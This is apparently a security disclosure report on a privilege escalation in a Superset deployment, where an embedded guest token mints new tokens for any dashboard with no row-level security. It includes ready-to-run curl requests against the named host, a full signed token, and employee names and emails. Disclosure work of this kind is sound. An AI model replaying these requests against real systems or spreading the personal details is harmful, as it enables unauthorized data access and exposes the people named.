# Superset Guest Token Privilege Escalation: Token Minting, RLS Bypass, and Full Dashboard Metadata Leakage

**Severity:** Critical — CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N (9.3)
**Class:** CWE-269 — Improper Privilege Management
**Target:** `POST /api/v1/security/guest_token/` on `bi.trustpoint.ai`
**Status:** Confirmed (token minting, RLS bypass, and metadata leakage all verified)

---

## Summary

An embedded Superset guest token — scoped to a single dashboard with Row Level Security (RLS) — can mint arbitrary new guest tokens via `POST /api/v1/security/guest_token/`. The newly minted tokens can be scoped to **any dashboard** (including internal-only dashboards like Sales & Client Engagement), with **no RLS rules**, effectively bypassing both dashboard scoping and row-level security. Additionally, the guest token leaks metadata for **all 21 dashboards**, including employee emails, internal role names, and customer-specific dashboard names.

The root cause is that the `EMBEDDED DASHBOARD ACCESS` Superset role grants `can_grant_guest_token` (among other excessive permissions) to guest users who should have read-only access to a single dashboard.

---

## Steps to Reproduce

### Step 1 — Obtain a guest token (normal embedded dashboard flow)

Navigate to the BI analytics page on `partner.trustpoint.ai` as any authenticated user (Investor, Borrower, etc.). The embedded Superset dashboard loads with a guest token obtained from the backend via `POST /api/v1/security/guest_token/`.

The guest token is scoped to one dashboard with RLS:
```json
{
  "resources": [{"type": "dashboard", "id": "ea095d5e-d7a0-498f-aaa4-e00a2a5a14d5"}],
  "rls_rules": [{"clause": "user_company_ids::jsonb ? '349823e1-322f-4dff-ac4a-b7d915b86875'"}],
  "type": "guest"
}
```

### Step 2 — Verify excessive permissions

```bash
curl -s 'https://bi.trustpoint.ai/api/v1/me/roles/' \
  -H 'X-Guesttoken: <guest_token>' \
  -H 'Cookie: session=<session_cookie>'
```

**Result:** The guest user has role `EMBEDDED DASHBOARD ACCESS` with 17 permissions including:
- `can_grant_guest_token` on SecurityRestApi — **can mint new tokens**
- `can_csv` on Superset — can export CSV
- `can_read` on Chart, Dashboard, Dataset, Annotation
- `can_query` on Api
- `can_explore_json` on Superset

### Step 3 — List all dashboards (should only see scoped dashboard)

```bash
curl -s 'https://bi.trustpoint.ai/api/v1/dashboard/?q=(page_size:100)' \
  -H 'X-Guesttoken: <guest_token>' \
  -H 'Cookie: session=<session_cookie>'
```

**Result:** `200 OK` — Returns **all 21 dashboards** with full metadata including:
- Dashboard titles (including internal: "Sales & Client Engagement", "DSCR Portfolio Analytics")
- Employee emails: `john@trustpoint.ai`, `yufeng@trustpoint.ai`, `michael@trustpoint.ai`, `tres@trustpoint.ai`, `harish.kari@trustpoint.ai`, `artur@trustpoint.ai`
- Internal roles: `INTERNAL - Customer Success`, `INTERNAL - Product`, `INTERNAL - Sales`
- Customer-specific dashboards: "Custom reports - TPG DEMO", "Custom Reports - Acra", "Custom reports - Genesis Capital"

### Step 4 — Mint a new guest token for a DIFFERENT dashboard with NO RLS (Critical)

```bash
curl -X POST 'https://bi.trustpoint.ai/api/v1/security/guest_token/' \
  -H 'X-Guesttoken: <guest_token>' \
  -H 'Cookie: session=<session_cookie>' \
  -H 'Content-Type: application/json' \
  -d '{
    "user": {"first_name": "Attacker", "last_name": "User"},
    "resources": [{"type": "dashboard", "id": "229c5b3b-a7e3-4a06-a35b-da6cf7f05562"}],
    "rls": []
  }'
```

**Result:** `200 OK` — Returns a valid new guest token:
```json
{
  "token": "eyJhbG...wnY"
}
```

Decoded payload of the minted token:
```json
{
  "user": {"first_name": "Attacker", "last_name": "User"},
  "resources": [{"type": "dashboard", "id": "229c5b3b-a7e3-4a06-a35b-da6cf7f05562"}],
  "rls_rules": [],
  "type": "guest"
}
```

The minted token is scoped to the **Sales & Client Engagement** dashboard (an internal dashboard) with **zero RLS rules** — completely bypassing row-level security.

### Step 5 — Verify minted token works

```bash
curl -s 'https://bi.trustpoint.ai/api/v1/dashboard/?q=(page_size:5)' \
  -H 'X-Guesttoken: <minted_token>'
```

**Result:** `200 OK` — The minted token is fully functional and lists all 21 dashboards.

### Step 6 — Mint multi-dashboard token with no RLS

```bash
curl -X POST 'https://bi.trustpoint.ai/api/v1/security/guest_token/' \
  -H 'X-Guesttoken: <guest_token>' \
  -H 'Content-Type: application/json' \
  -d '{
    "user": {"first_name": "Full", "last_name": "Access"},
    "resources": [
      {"type": "dashboard", "id": "cc1bbd9f-09b7-4487-91ec-4a973cabd3db"},
      {"type": "dashboard", "id": "a4beef05-63e0-45ea-8612-38881fa7058c"},
      {"type": "dashboard", "id": "a35e07f8-89f1-488c-ae39-863564bb1b1f"},
      {"type": "dashboard", "id": "bd98f9b3-6983-40a4-8eb5-ec9de9d30224"},
      {"type": "dashboard", "id": "229c5b3b-a7e3-4a06-a35b-da6cf7f05562"}
    ],
    "rls": []
  }'
```

**Result:** `200 OK` — Returns a valid token scoped to **5 dashboards simultaneously** with **no RLS rules**.

---

## Proof of Concept

### Request (Token Minting)

```http
POST /api/v1/security/guest_token/ HTTP/2
Host: bi.trustpoint.ai
X-Guesttoken: eyJhbGciOiJIUzI1NiIs...<original_guest_token>
Cookie: session=<session_cookie>
Content-Type: application/json

{
  "user": {"first_name": "Attacker", "last_name": "User"},
  "resources": [{"type": "dashboard", "id": "229c5b3b-a7e3-4a06-a35b-da6cf7f05562"}],
  "rls": []
}
```

### Response

```http
HTTP/2 200 OK
Content-Type: application/json

{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImZpcnN0X25hbWUiOiJBdHRhY2tlciIsImxhc3RfbmFtZSI6IlVzZXIifSwicmVzb3VyY2VzIjpbeyJ0eXBlIjoiZGFzaGJvYXJkIiwiaWQiOiIyMjljNWIzYi1hN2UzLTRhMDYtYTM1Yi1kYTZjZjdmMDU1NjIifV0sInJsc19ydWxlcyI6W10sImlhdCI6MTc5MjA2NzM0Mi4yNzQzOTMzLCJleHAiOjE3OTIwNzA5NDIuMjc0MzkzMywiYXVkIjoiaHR0cDovL3N1cGVyaW9uLWFwcDo4MDg4LyIsInR5cGUiOiJndWVzdCJ9.n1dYQnJwAzIhwiEH-PB3vN-ZF7j4tFalYpGOa9YrwnY"
}
```

### Decoded Minted Token Payload

```json
{
  "user": {"first_name": "Attacker", "last_name": "User"},
  "resources": [{"type": "dashboard", "id": "229c5b3b-a7e3-4a06-a35b-da6cf7f05562"}],
  "rls_rules": [],
  "iat": 1792067342.2743933,
  "exp": 1792070942.2743933,
  "aud": "http://superion-app:8088/",
  "type": "guest"
}
```

### Dashboard Metadata Leak (Partial)

```
ID: 293 | EMBED CUSTOM: Custom reports - TPG DEMO
  Owner: Tres Seippel <tres@trustpoint.ai>
  Owner: Harish Kari <harish.kari@trustpoint.ai>

ID: 145 | EMBED: Sales & Client Engagement
  Owner: John Adractas <john@trustpoint.ai>

ID: 211 | DEMO: Budget Benchmarking [BETA release]
  Owner: John Adractas <john@trustpoint.ai>
  Roles: INTERNAL - Product, INTERNAL - Sales
```

---

## Impact

### 1. Guest Token Privilege Escalation (Critical)
A guest user scoped to one dashboard can mint new tokens for **any** of the 21 dashboards, including internal dashboards not intended for external users. This completely defeats the purpose of dashboard-scoped guest tokens.

### 2. Row Level Security Bypass (Critical)
Minted tokens can specify `rls: []` (empty RLS rules), bypassing the row-level security that normally restricts data visibility to the user's company. The original token filters by `user_company_ids::jsonb ? '<company_id>'` — the minted token has no such restriction.

### 3. Employee PII Leakage (Medium)
The dashboard listing endpoint leaks full names and corporate email addresses for 7 Trustpoint employees:
- John Adractas, Yufeng Chen, Michael Khait, Tres Seippel, Harish Kari, Artur Veres, Mike Lytvynenko

### 4. Internal Infrastructure Disclosure (Low)
- Internal hostname leaked in JWT `aud` field: `http://superion-app:8088/`
- Internal role names exposed: `INTERNAL - Customer Success`, `INTERNAL - Product`, `INTERNAL - Sales`
- Customer-specific dashboard names leak client relationships: TPG DEMO, Genesis Capital, Acra

### 5. Datasource Enumeration (Low)
40+ internal database table names leaked via 403 error messages that include `datasource_name` (e.g., `tp_dw_production.rpt_project`, `tp_dw_production.rpt_loan_tape`, `tp_dw_production.rpt_project_member`).

---

## Excessive Permission Matrix

| Permission | Resource | Risk |
|-----------|----------|------|
| `can_grant_guest_token` | SecurityRestApi | **Mint arbitrary tokens — privilege escalation** |
| `can_read` | Dashboard | Enumerate all 21 dashboards with PII |
| `can_read` | Chart | Read chart configurations |
| `can_read` | Dataset | Read dataset schemas |
| `can_csv` | Superset | Export data as CSV |
| `can_query` | Api | Execute queries against datasources |
| `can_explore_json` | Superset | Access chart exploration endpoint |
| `can_write` | DashboardFilterStateRestApi | Modify dashboard filter state |

---

## Remediation

1. **Remove `can_grant_guest_token` from the EMBEDDED DASHBOARD ACCESS role immediately** — guest users should never be able to mint new tokens
2. **Restrict dashboard listing** to only the dashboard(s) the guest token is scoped to — apply the `resources` filter from the JWT to the dashboard list API
3. **Strip owner email addresses** from the dashboard list API response for guest users
4. **Suppress `datasource_name` from 403 error messages** — return a generic "access denied" without revealing internal table names
5. **Review the EMBEDDED DASHBOARD ACCESS role** and apply principle of least privilege — remove `can_csv`, `can_explore_json`, `can_query`, and `can_write` permissions
6. **Implement server-side validation** in the guest token minting endpoint to prevent guests from creating tokens with broader scope or fewer RLS rules than their own token

---

## References

- [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
- [OWASP API1:2023 — Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [OWASP API5:2023 — Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
- [Apache Superset Security: Guest Token](https://superset.apache.org/docs/security/#guest-token)
